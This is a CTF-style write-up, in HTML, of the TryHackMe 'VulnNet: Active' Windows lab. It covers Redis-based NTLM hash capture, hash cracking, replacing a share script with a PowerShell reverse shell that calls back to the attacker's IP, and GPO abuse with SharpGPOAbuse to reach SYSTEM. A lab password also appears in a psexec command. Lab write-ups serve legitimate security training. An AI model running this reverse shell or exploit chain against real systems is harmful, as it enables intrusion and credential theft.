@@ -1,0 +1,403 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <link rel="stylesheet" href="/assets/css/style.css" />
+        <link rel="stylesheet" href="/assets/css/writeups/style.css" />
+        <title>VulnNet: Active - pwnerguy's shell stuff</title>
+        <!-- <link rel="icon" type="image/png" href="/favicons/favicon-96x96.png" sizes="96x96" />
+        <link rel="icon" type="image/svg+xml" href="/favicons/favicon.svg" /> -->
+        <link rel="shortcut icon" href="/assets/favicons/favicon.ico" />
+        <!-- <link rel="apple-touch-icon" sizes="180x180" href="/favicons/apple-touch-icon.png" />
+        <link rel="manifest" href="/favicons/site.webmanifest" /> -->
+        <meta name="apple-mobile-web-app-title" content="pwnerguy's shell stuff" />
+        <!-- SEO -->
+        <meta name="description" content="pwnerguy's shell stuff is an offensive cybersecurity blog focused on solving practical labs from the Hack The Box, TryHackMe and VulnHub platforms." />
+        <meta name="keywords" content="pwnerguy, Rubén Martos, ethical hacking, ethical hacker, penetration testing, pentesting, offensive cybersecurity, cybersecurity, Hack The Box, TryHackMe, VulnHub, SysAdmin, Linux, Windows, writeups, projects, portfolio, pwnerguy.github.io" />
+        <meta name="author" content="pwnerguy" />
+        <meta name="robots" content="index, follow" />
+    </head>
+    <body>
+        <header>
+            <a href="/" class="logo">pwnerguy's shell stuff</a>
+            <nav>
+                <a href="/writeups">Writeups</a>
+                <a href="/cheatsheets">Cheat Sheets</a>
+            </nav>
+        </header>
+        <main>
+            
+        <a href="/writeups" class="back-link">← Go back</a>
+        <section class="writeup-content">
+            <h1>VulnNet: Active</h1>
+<div class="writeup-tags"><span class="tag tag-tryhackme">TryHackMe</span> <span class="tag tag-medium">Medium</span> <span class="tag tag-windows">Windows</span> <span class="tag tag-kerberos-user-enum">Kerberos User Enum</span> <span class="tag tag-hash-cracking">Hash Cracking</span> <span class="tag tag-specific-binary">Specific Binary</span> <span class="tag tag-gpo">GPO</span></div>
+<hr>
+<h2>Introduction</h2>
+<p>This writeup documents the penetration testing of the <a href="https://tryhackme.com/room/vulnnetactive"><strong>VulnNet: Active</strong></a> machine from the <a href="https://tryhackme.com/"><strong>TryHackMe</strong></a> platform.         In this ocasion, I&#39;ll abuse a vulnerable Redis DB service, use it to capture a NTLM hash to access the machine and finally perform a GPO Abuse to escalate privileges.</p>
+<hr>
+<h2>Information Gathering</h2>
+<p>After identifying the target&#39;s IP address, we need to enumerate as  much information as possible about the host. A quick way to get a hint of the OS is checking the TTL value from a simple ping to a host on our local network. <a href="https://github.com/pwnerguy/ttl-ripper"><strong>ttl-ripper.sh</strong></a> can also be used for this purpose.</p>
+<ul>
+<li>TTL 64: Linux.</li>
+<li>TTL 128: Windows.</li>
+</ul>
+<pre><code>❯ ping -c 1 10.10.234.191
+PING 10.10.234.191 (10.10.234.191) 56(84) bytes of data.
+64 bytes from 10.10.234.191: icmp_seq=1 ttl=127 time=56.2 ms
+
+--- 10.10.234.191 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 56.229/56.229/56.229/0.000 ms
+</code></pre>
+<p>In this case, the target seems to be a Windows machine. Let&#39;s perform some scans.</p>
+<pre><code>❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.234.191 -oG allPorts
+Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times may be slower.
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-08 14:52 CET
+Initiating SYN Stealth Scan at 14:52
+Scanning 10.10.234.191 [65535 ports]
+Discovered open port 445/tcp on 10.10.234.191
+Discovered open port 53/tcp on 10.10.234.191
+Discovered open port 139/tcp on 10.10.234.191
+Discovered open port 135/tcp on 10.10.234.191
+Discovered open port 49673/tcp on 10.10.234.191
+Discovered open port 49795/tcp on 10.10.234.191
+Discovered open port 6379/tcp on 10.10.234.191
+Discovered open port 49677/tcp on 10.10.234.191
+Discovered open port 49674/tcp on 10.10.234.191
+Discovered open port 9389/tcp on 10.10.234.191
+Discovered open port 49667/tcp on 10.10.234.191
+Discovered open port 464/tcp on 10.10.234.191
+Discovered open port 49701/tcp on 10.10.234.191
+Discovered open port 49666/tcp on 10.10.234.191
+Completed SYN Stealth Scan at 14:53, 40.17s elapsed (65535 total ports)
+Nmap scan report for 10.10.234.191
+Host is up, received user-set (0.17s latency).
+Scanned at 2025-11-08 14:52:41 CET for 40s
+Not shown: 65521 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT      STATE SERVICE      REASON
+53/tcp    open  domain       syn-ack ttl 127
+135/tcp   open  msrpc        syn-ack ttl 127
+139/tcp   open  netbios-ssn  syn-ack ttl 127
+445/tcp   open  microsoft-ds syn-ack ttl 127
+464/tcp   open  kpasswd5     syn-ack ttl 127
+6379/tcp  open  redis        syn-ack ttl 127
+9389/tcp  open  adws         syn-ack ttl 127
+49666/tcp open  unknown      syn-ack ttl 127
+49667/tcp open  unknown      syn-ack ttl 127
+49673/tcp open  unknown      syn-ack ttl 127
+49674/tcp open  unknown      syn-ack ttl 127
+49677/tcp open  unknown      syn-ack ttl 127
+49701/tcp open  unknown      syn-ack ttl 127
+49795/tcp open  unknown      syn-ack ttl 127
+
+Read data files from: /usr/share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 40.27 seconds
+           Raw packets sent: 196605 (8.651MB) | Rcvd: 44 (1.936KB)
+</code></pre>
+<pre><code>❯ nmap -sCV -p53,135,139,445,464,6379,9389,49666,49667,49673,49674,49677,49701,49795 10.10.234.191 -oN targeted
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-08 14:53 CET
+Nmap scan report for VULNNET-BC3TCK1.VULNNET.LOCAL (10.10.234.191)
+Host is up (0.055s latency).
+
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+6379/tcp  open  redis         Redis key-value store 2.8.2402
+9389/tcp  open  mc-nmf        .NET Message Framing
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49674/tcp open  msrpc         Microsoft Windows RPC
+49677/tcp open  msrpc         Microsoft Windows RPC
+49701/tcp open  msrpc         Microsoft Windows RPC
+49795/tcp open  msrpc         Microsoft Windows RPC
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2025-11-08T13:54:54
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 95.41 seconds
+</code></pre>
+<p>Nmap found some open ports, but we can&#39;t determinate much more things from the output.</p>
+<pre><code>❯ nxc smb 10.10.234.191 -u &#39;guest&#39; -p &#39;&#39; --shares
+SMB         10.10.234.191     445    VULNNET-BC3TCK1  [*] Windows 10 / Server 2019 Build 17763 x64 (name:VULNNET-BC3TCK1) (domain:vulnnet.local) (signing:True) (SMBv1:False) 
+SMB         10.10.234.191     445    VULNNET-BC3TCK1  [-] vulnnet.local\guest: STATUS_ACCOUNT_DISABLED
+</code></pre>
+<p>I found the domain which is <code>vulnnet.local</code> and it seems that we are facing a Windows Server 2019 with the hostname <code>VULNNET-BC3TCK1</code>. The account guest is disabled so le&#39;ts try other enumeration vectors.</p>
+<p>I&#39;ll add in my /etc/hosts file the following line:</p>
+<pre><code>10.10.234.191 VULNNET-BC3TCK1.VULNNET.LOCAL VULNNET.LOCAL
+</code></pre>
+<pre><code>❯ ./kerbrute_linux_amd64 userenum --dc VULNNET-BC3TCK1.VULNNET.LOCAL -d VULNNET.LOCAL /home/kali/labs/thm/AttacktiveDirectory/scripts/userlist.txt
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: v1.0.3 (9dad6e1) - 11/08/25 - Ronnie Flathers @ropnop
+
+2025/11/08 14:21:41 &gt;  Using KDC(s):
+2025/11/08 14:21:41 &gt;  	VULNNET-BC3TCK1.VULNNET.LOCAL:88
+
+2025/11/08 14:21:53 &gt;  [+] VALID USERNAME:	administrator@VULNNET.LOCAL
+2025/11/08 14:23:20 &gt;  [+] VALID USERNAME:	Administrator@VULNNET.LOCAL
+</code></pre>
+<p>We can&#39;t get so much information bruteforcing kerberos to enumerate users.</p>
+<pre><code>❯ enum4linux -a 10.10.234.191
+Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat Nov  8 14:33:45 2025
+
+ =========================================( Target Information )=========================================
+
+Target ........... 10.10.234.191
+RID Range ........ 500-550,1000-1050
+Username ......... &#39;&#39;
+Password ......... &#39;&#39;
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+...
+
+=================================( Getting domain SID for 10.10.234.191 )=================================
+
+Domain Name: VULNNET
+Domain Sid: S-1-5-21-1405206085-1650434706-76331420
+
+[+] Host is part of a domain (not a workgroup)
+</code></pre>
+<p><code>enum4linux</code> gives us the SID of the domain and some usernames but no much more interesting information about the DC.</p>
+<hr>
+<h2>Vulnerability Assessment</h2>
+<p>At this point I was a bit stuck here. I reviewed nmap&#39;s output and saw this:</p>
+<pre><code>6379/tcp  open  redis        syn-ack ttl 127
+</code></pre>
+<blockquote>
+<p><strong>Redis</strong> is an open-source, in-memory data structure store used as a database, cache, and message broker. It stores data in memory to achieve high performance and low latency, but it also has optional features to persist data to disk for durability. It is known for speed and is widely used in applications like real-time analytics, gaming leaderboards, and session stores</p>
+</blockquote>
+<p>So, Redis is a kind of a DB service. Let&#39;s try to focus on this service, since we can&#39;t do much with the SMB service and Kerberos port is not even open...</p>
+<pre><code>❯ redis-cli -h 10.10.234.191
+10.10.234.191:6379&gt; config get *
+...
+1) &quot;C:\\Users\\enterprise-security\\Downloads\\Redis-x64-2.8.2402&quot;
+...
+</code></pre>
+<p>We found a user. Let&#39;s abuse redis to get the <strong>NTLM hash</strong> of this user.</p>
+<hr>
+<h2>Exploitation</h2>
+<ul>
+<li>I&#39;ll start responder with <code>responder -I tun0</code> in other terminal session to capture the NTLM hash</li>
+<li>In the redis-cli session I have, I&#39;ll run the following command to force the user <code>enterprise-security</code> to access a file called <em>test</em> that doesn&#39;t exist.</li>
+</ul>
+<pre><code>eval &quot;dofile(&#39;//10.8.78.182/test&#39;)&quot; 0
+</code></pre>
+<p>Once we have captured the <strong>NTLM hash</strong> of the <code>enterprise-secutiry</code> user we need to <strong>crack it</strong>.</p>
+<pre><code>❯ john -w:/usr/share/wordlists/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+Will run 7 OpenMP threads
+Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+***REDACTED***  (enterprise-security)     
+1g 0:00:00:01 DONE (2025-11-08 15:25) 0.5235g/s 2101Kp/s 2101Kc/s 2101KC/s sandrita107..sand36
+Use the &quot;--show --format=netntlmv2&quot; options to display all of the cracked passwords reliably
+Session completed.
+</code></pre>
+<p>Now that we have valid credentials in the domain, we can try to list shared resources with <code>smbclient.py</code></p>
+<pre><code>❯ smbclient -L //10.10.234.191 -U enterprise-security
+Password for [WORKGROUP\enterprise-security]:
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	Enterprise-Share Disk      
+	IPC$            IPC       Remote IPC
+	NETLOGON        Disk      Logon server share 
+	SYSVOL          Disk      Logon server share 
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.10.234.191 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+
+❯ smbclient //10.10.234.191/Enterprise-Share -U enterprise-security
+Password for [WORKGROUP\enterprise-security]:
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; pwd
+Current directory is \\10.10.234.191\Enterprise-Share\
+smb: \&gt; cd C:\Users
+cd \C:\Users\: NT_STATUS_OBJECT_NAME_INVALID
+smb: \&gt; ls
+  .                                   D        0  Tue Feb 23 23:45:41 2021
+  ..                                  D        0  Tue Feb 23 23:45:41 2021
+  PurgeIrrelevantData_1826.ps1        A       69  Wed Feb 24 01:33:18 2021
+
+		9558271 blocks of size 4096. 5116702 blocks available
+</code></pre>
+<p>Let&#39;s use <code>meterpeter</code> multi handler session to get an interactive session in the machine.</p>
+<p><img src="/assets/images/vulnnet-active/multi_handler.png" alt=""></p>
+<p>Now, I&#39;ll create a <code>PurgeIrrelevantData_1826.ps1</code> file to replace the actual one with the following content:</p>
+<pre><code class="language-powershell">$client = New-Object System.Net.Sockets.TCPClient(&#39;10.8.78.182&#39;,4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+</code></pre>
+<p>After putting the new <code>PurgeIrrelevantData_1826.ps1</code> script in the shared resource and waiting, we get an interactive PowerShell session in the meterpreter session.</p>
+<p><img src="/assets/images/vulnnet-active/whoami.png" alt=""></p>
+<p>In the Desktop directory you&#39;ll find the user flag.</p>
+<hr>
+<h2>Post-Exploitation</h2>
+<p>We can use SharpGPOAbuse.</p>
+<blockquote>
+<p><strong>SharpGPOAbuse</strong> is a tool written in C# that allows an attacker to exploit edit permissions on a Group Policy Object (GPO) to execute tasks on machines that enforce that policy. If a user has permissions such as <em>GenericWrite</em> on a GPO, they can modify it to execute arbitrary code on the affected machines.</p>
+</blockquote>
+<p>I&#39;ll download <a href="https://github.com/FSecureLABS/SharpGPOAbuse">SharpexeGPOAbuse.exe</a> and update the group policies on the target machine:</p>
+<pre><code>PS C:\Enterprise-Share&gt; .\SharpGPOAbuse.exe --AddComputerTask --TaskName &quot;Debug&quot; --Author vulnnet\administrator --Command &quot;cmd.exe&quot; --Arguments &quot;/c net localgroup administrators enterprise-security /add&quot; --GPOName &quot;SECURITY-POL-VN&quot;
+[+] Domain = vulnnet.local
+[+] Domain Controller = VULNNET-BC3TCK1SHNQ.vulnnet.local
+[+] Distinguished Name = CN=Policies,CN=System,DC=vulnnet,DC=local
+[+] GUID of &quot;SECURITY-POL-VN&quot; is: {31B2F340-016D-11D2-945F-00C04FB984F9}
+[+] Creating file \\vulnnet.local\SysVol\vulnnet.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
+[+] versionNumber attribute changed successfully
+[+] The version number in GPT.ini was increased successfully.
+[+] The GPO was modified to include a new immediate task. Wait for the GPO refresh cycle.
+[+] Done!
+PS C:\Enterprise-Share&gt; gpupdate /force
+Updating policy...
+
+
+
+Computer Policy update has completed successfully.
+
+User Policy update has completed successfully.
+</code></pre>
+<p>The enterprise-security user has GenericWrite over the GPO <code>SECURITY-POL-VN</code>, which allows him to modify it. Once we modify this GPO, we can execute commands in the hosts that are aplying that GPO. </p>
+<p>Now I&#39;ll cccess the machine with the new privileges and finally, you&#39;ll find the system flag in Administrator&#39;s desktop</p>
+<pre><code>❯ psexec.py enterprise-security:sand_0873959498@10.10.234.19
+Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Requesting shares on 10.10.234.191.....
+[*] Found writable share ADMIN$
+[*] Uploading file LLDejgtI.exe
+[*] Opening SVCManager on 10.10.234.191.....
+[*] Creating service ICNz on 10.10.234.191.....
+[*] Starting service ICNz.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.1757]
+(c) 2018 Microsoft Corporation. All rights reserved.
+C:\Windows\system32&gt; whoami
+nt authority\system
+C:\Windows\system32&gt; type C:\Users\Administrator\Desktop\system.txt
+***REDACTED***
+</code></pre>
+
+        </section>
+    
+        </main>
+        <footer>
+            <p>© 2026 <strong>pwnerguy's shell stuff</strong></p>
+            <div class="icons">
+                <a href="mailto:rmp.it@proton.me" target="_blank"">
+                    <svg class="svg-inline--fa fa-envelope-square fa-w-14 fa-fw" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="envelope-square" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M400 32H48C21.49 32 0 53.49 0 80v352c0 26.51 21.49 48 48 48h352c26.51 0 48-21.49 48-48V80c0-26.51-21.49-48-48-48zM178.117 262.104C87.429 196.287 88.353 196.121 64 177.167V152c0-13.255 10.745-24 24-24h272c13.255 0 24 10.745 24 24v25.167c-24.371 18.969-23.434 19.124-114.117 84.938-10.5 7.655-31.392 26.12-45.883 25.894-14.503.218-35.367-18.227-45.883-25.895zM384 217.775V360c0 13.255-10.745 24-24 24H88c-13.255 0-24-10.745-24-24V217.775c13.958 10.794 33.329 25.236 95.303 70.214 14.162 10.341 37.975 32.145 64.694 32.01 26.887.134 51.037-22.041 64.72-32.025 61.958-44.965 81.325-59.406 95.283-70.199z"></path></svg>
+                </a>
+                <a href="https://www.linkedin.com/in/r-mar" target="_blank">
+                    <svg class="svg-inline--fa fa-linkedin fa-w-14 fa-fw" aria-hidden="true" focusable="false" data-prefix="fab" data-icon="linkedin" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"></path></svg>
+                </a>
+                <a href="https://github.com/pwnerguy" target="_blank">
+                    <svg class="svg-inline--fa fa-github fa-w-16 fa-fw" aria-hidden="true" focusable="false" data-prefix="fab" data-icon="github" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512" data-fa-i2svg=""><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"></path></svg>
+                </a>
+                <a href="https://tryhackme.com/p/pwnerguy" target="_blank">
+                    <svg class="svg-inline--fa fa-user-secret fa-w-14" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="user-secret" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M383.9 308.3l23.9-62.6c4-10.5-3.7-21.7-15-21.7h-58.5c11-18.9 17.8-40.6 17.8-64v-.3c39.2-7.8 64-19.1 64-31.7 0-13.3-27.3-25.1-70.1-33-9.2-32.8-27-65.8-40.6-82.8-9.5-11.9-25.9-15.6-39.5-8.8l-27.6 13.8c-9 4.5-19.6 4.5-28.6 0L182.1 3.4c-13.6-6.8-30-3.1-39.5 8.8-13.5 17-31.4 50-40.6 82.8-42.7 7.9-70 19.7-70 33 0 12.6 24.8 23.9 64 31.7v.3c0 23.4 6.8 45.1 17.8 64H56.3c-11.5 0-19.2 11.7-14.7 22.3l25.8 60.2C27.3 329.8 0 372.7 0 422.4v44.8C0 491.9 20.1 512 44.8 512h358.4c24.7 0 44.8-20.1 44.8-44.8v-44.8c0-48.4-25.8-90.4-64.1-114.1zM176 480l-41.6-192 49.6 32 24 40-32 120zm96 0l-32-120 24-40 49.6-32L272 480zm41.7-298.5c-3.9 11.9-7 24.6-16.5 33.4-10.1 9.3-48 22.4-64-25-2.8-8.4-15.4-8.4-18.3 0-17 50.2-56 32.4-64 25-9.5-8.8-12.7-21.5-16.5-33.4-.8-2.5-6.3-5.7-6.3-5.8v-10.8c28.3 3.6 61 5.8 96 5.8s67.7-2.1 96-5.8v10.8c-.1.1-5.6 3.2-6.4 5.8z"></path></svg>
+                </a>
+                <a href="https://app.hackthebox.com/users/3026377" target="_blank" rel="noopener">
+                    <svg class="svg-inline--fa fa fa-cube" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="fa-cube" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M239.1 6.3l-208 78c-18.7 7-31.1 25-31.1 45v225.1c0 18.2 10.3 34.8 26.5 42.9l208 104c13.5 6.8 29.4 6.8 42.9 0l208-104c16.3-8.1 26.5-24.8 26.5-42.9V129.3c0-20-12.4-37.9-31.1-44.9l-208-78C262 2.2 250 2.2 239.1 6.3zM256 68.4l192 72v1.1l-192 78-192-78v-1.1l192-72zm32 356V275.5l160-65v133.9l-160 80z"></path></svg>
+                </a>
+            </div>
+        </footer>
+        <script>
+            // document.addEventListener("DOMContentLoaded", () => {
+            //     const cards = document.querySelectorAll('.writeup-card');
+            //     const searchInput = document.getElementById('searchInput');
+            //     if (!searchInput) return;
+            //     searchInput.addEventListener('input', () => {
+            //         const q = searchInput.value.toLowerCase();
+            //         cards.forEach(card => {
+            //             const categories = (card.dataset.categories || "").toLowerCase();
+            //             const title = card.querySelector("h2").textContent.toLowerCase();
+            //             const haystack = `${categories} ${title}`;
+            //             if (haystack.includes(q)) {
+            //                 card.classList.remove("hidden");
+            //             } else {
+            //                 card.classList.add("hidden");
+            //             }
+            //         });
+            //     });
+            // });
+
+            document.addEventListener("DOMContentLoaded", () => {
+            document.querySelectorAll('a[href^="http"]').forEach(a => {
+                a.setAttribute("target", "_blank");
+                a.setAttribute("rel", "noopener noreferrer");
+            });
+            });
+
+            // document.addEventListener("DOMContentLoaded", () => {
+            //     const cards = document.querySelectorAll('.writeup-card');
+            //     const searchInput = document.getElementById('searchInput');
+            //     if (!searchInput) return;
+            //     searchInput.addEventListener('input', () => {
+            //         const terms = searchInput.value
+            //             .toLowerCase()
+            //             .trim()
+            //             .split(/\s+/);
+            //         cards.forEach(card => {
+            //             const categories = (card.dataset.categories || "").toLowerCase();
+            //             const title = card.querySelector("h2").textContent.toLowerCase();
+            //             const haystack = `${categories} ${title}`.replace(/\s+/g, " ");
+            //             const matches = terms.every(t => haystack.includes(t));
+            //             card.classList.toggle("hidden", !matches);
+            //         });
+            //     });
+            // });
+
+            document.addEventListener("DOMContentLoaded", () => {
+                const cards = document.querySelectorAll('.writeup-card');
+                const searchInput = document.getElementById('searchInput');
+                const resultsCount = document.getElementById('resultsCount');
+
+                function updateCount() {
+                    const visible = document.querySelectorAll(".writeup-card:not(.hidden)").length;
+                    if (resultsCount) {
+                        resultsCount.textContent = `${visible} available machines`;
+                    }
+                }
+
+                if (!searchInput) return;
+
+                searchInput.addEventListener('input', () => {
+                    const terms = searchInput.value
+                        .toLowerCase()
+                        .trim()
+                        .split(/\s+/);
+
+                    cards.forEach(card => {
+                        const categories = (card.dataset.categories || "").toLowerCase();
+                        const title = card.querySelector("h2").textContent.toLowerCase();
+                        const haystack = `${categories} ${title}`.replace(/\s+/g, " ");
+
+                        const matches = terms.every(t => haystack.includes(t));
+                        card.classList.toggle("hidden", !matches);
+                    });
+
+                    updateCount();
+                });
+
+                updateCount();
+            });
+
+        </script>
+    </body>
+</html>
